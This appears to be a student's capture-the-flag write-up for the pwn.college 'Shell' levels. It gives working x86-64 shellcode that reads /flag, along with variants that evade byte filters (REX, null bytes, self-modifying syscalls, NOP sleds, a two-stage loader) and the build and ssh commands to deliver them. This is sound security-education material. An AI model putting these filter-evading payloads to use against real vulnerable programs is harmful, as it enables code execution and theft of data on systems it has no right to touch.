# pwn.college
## CSE466
### Shell
#### 1 - 2

We are asked to receive the flag in '/flag'. First, we write the assembly code corresponding to the shellcode that we want to generate:

```asm
.global _start


_start:
  movq $2, %rax  # open()
  leaq flag(%rip), %rdi # RIP relative addressing
  movq $0, %rsi
  movq $0, %rdx
  syscall
  
  movq %rax, %rsi
  movq $40, %rax # syscall sendfile
  movq $1, %rdi
  movq $0, %rdx
  movq $1000, %r10
  syscall

flag: .asciz "/flag"
```

Than, we need to compile it and dump its `.text` section with `objcopy`:

```
gcc -no-pie -nostdlib -o 1 1.s
objcopy -O binary --only-section=.text 1 1.raw
```

Now, all we need to do is provide this 1.raw as input to the binary and we get the flag!

#### 3
This challenge forbids us from using the H(0x48) byte in our shellcode. Unfortunately, this is the byte for the [REX](https://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix) prefix, which is necessary when you use 64 bit operands with operations that don't support it.


Thankfully, push and pop can do long-mode operations without using the REX prefix, so we can use them instead of mov. But this removes our ability to do rip relative addressing. Here is the code that should achieve that:

```
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  pushq $2
  popq %rax
  pushq $0x1337025
  popq %rdi
  pushq $0
  popq %rsi
  pushq $0
  popq %rdx
  syscall
  
  pushq %rax
  popq %rsi
  pushq $40
  popq %rax
  pushq $1
  popq %rdi
  pushq $0
  popq %rdx
  pushq $1000
  popq %r10
  syscall

flag: .asciz "/flag"
```

#### 4 
This time, we can't use the 0x00 byte in our shellcode. Thankfully, we don't have to. We can't use `xor` to zero registers and some other tricks. Here is the assembly solution for that:

```assembly
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  pushq $2
  popq %rax
  pushq $0x1337026
  popq %rdi
  xor %rsi, %rsi
  xor %rdx, %rdx
  syscall
  
  pushq %rax
  popq %rsi
  pushq $40
  popq %rax
  pushq $1
  popq %rdi
  xor %rdx, %rdx
  xor %r10, %r10
  movw $1000, %r10w
  syscall

flag: .ascii "/flag"
```

#### 5
Shit, now we can't even use syscalls, we need to dynamically override the shellcode. What we need to do is, we first need to allocate space in our code for the syscalls using two `ret`instructions. (each `ret` is 1 byte while each `syscall` is 2). Than, we can just overwrite the addresses relative to `%rip`.

```assembly
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  movq $2, %rax
  leaq flag(%rip), %rdi
  xor %rsi, %rsi
  xor %rdx, %rdx
  movb $0x05, 8(%rip)
  movb $0x0f, (%rip)
  ret
  ret
  
  movq %rax, %rsi
  movq $40, %rax
  movq $1, %rdi

  xor %rdx, %rdx
  movq $1000, %r10

  movb $0x05, 8(%rip)
  movb $0x0f, (%rip)
  ret
  ret

flag: .asciz "/flag"
```

#### 6
We still need to edit code on runtime, but this time, we don't have write access to the first 4096 of our shellcode. Cool, why don't we just place our main code further then?

```assembly
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  leaq main(%rip), %rdx
  jmp *%rdx
  .skip 4096
main:
  movq $2, %rax
  leaq flag(%rip), %rdi
  xor %rsi, %rsi
  xor %rdx, %rdx
  movb $0x05, 8(%rip)
  movb $0x0f, (%rip)
  ret
  ret
  
  movq %rax, %rsi
  movq $40, %rax
  movq $1, %rdi

  xor %rdx, %rdx
  movq $1000, %r10

  movb $0x05, 8(%rip)
  movb $0x0f, (%rip)
  ret
  ret

flag: .asciz "/flag"
```

#### 7
This time, we need to consider that our shellcode might start from 0x800 bytes into the shellcode. All we need is a NOP sled:

```assembly
.global _start


_start:
  nop # 0x800 times
  movq $2, %rax  # open()
  leaq flag(%rip), %rdi # RIP relative addressing
  movq $0, %rsi
  movq $0, %rdx
  syscall
  
  movq %rax, %rsi
  movq $40, %rax # syscall sendfile
  movq $1, %rdi
  movq $0, %rdx
  movq $1000, %r10
  syscall

flag: .asciz "/flag"
```

#### 8
This one is tough, our code is going to be sorted using bubble sort at each  8 bytes. We can just add nops in our code. I think that is hardly the best solution, but here is mine:

```assembly
#
# 1.s
# Shell
#
# Created by Yigit Colakoglu on 09/26/21.
# Copyright 2021. Yigit Colakoglu. All rights reserved.
#

.global _start


_start:
  nop
  movq $2, %rax  # open()
  nop
  movq $0, %rsi
  nop
  movq $0, %rdx
  nop
  leaq flag(%rip), %rdi # RIP relative addressing
  nop
  nop
  nop
  nop
  nop
  nop
  syscall

  nop
  nop
  nop
  nop
  nop
  nop
  nop
  pushq %rax
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  popq %rsi
  movq $40, %rax # syscall sendfile
  nop
  movq $1, %rdi
  nop
  movq $0, %rdx
  nop
  movq $1000, %r10
  nop
  syscall
  nop
  nop
  nop
  nop
  nop
  nop

.byte 0xFF, 0xFF, 0xFF
flag: .ascii "/flag"
```

#### 9
Solution for 8 works here as well, maybe I tried too hard in the previous one?

#### 10
Now this one is tough, we can't use duplicated bytes in our shellcode. No way we can input the whole code once then, we need a **2 stage** exploit, we need to read in another shellcode and run that to bypass the filter. Here is the code that does that, and we can run the shellcode for the 1st stage:

```assembly
.global _start

_start:
  xorq %rdi, %rdi
  addb $0xd, %dl
  pushq %rdx
  popq %rsi
  pushq $0x44
  popq %rdx
  syscall
```

In order to keep stdin open and control the outputs, we can use this command:
```bash
(cat 10.raw; sleep 30; cat 1.raw) | ssh cse466@cse466.pwn.college /babyshell_level10_testing1
```

#### 11

TODO
